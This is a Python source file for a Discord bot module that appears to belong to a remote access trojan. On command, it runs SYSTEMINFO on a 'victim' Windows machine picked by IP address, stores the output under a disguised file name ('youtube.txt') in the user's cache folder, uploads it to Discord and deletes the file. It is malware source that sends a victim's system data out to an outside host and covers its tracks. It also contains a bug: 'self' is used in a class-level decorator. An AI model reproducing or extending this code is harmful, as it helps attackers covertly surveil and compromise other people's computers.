import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests, time, subprocess
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class SytemInfo(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.ip_addr = self.bot.ip_addr
        
    @commands.slash_command(
        description="Sends General System Information",
        options=[self.bot.victim],
    )
    async def get_systeminfo(self, ctx, victim):
        if str(victim) == str(self.ip_addr):
            await ctx.response.defer()
            
            subprocess.run(
                f'SYSTEMINFO > "{nr_working}\\youtube.txt"',
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            await ctx.followup.send(
                embed=self.bot.genEmbed( "System Information:", datetime.now() ),
                file=discord.File(nr_working + "\\youtube.txt", filename="systeminfo.txt"), 
            )
            time.sleep(2)
            os.remove(nr_working + "\\youtube.txt")

def setup(bot: commands.Bot):
    bot.add_cog(SytemInfo(bot))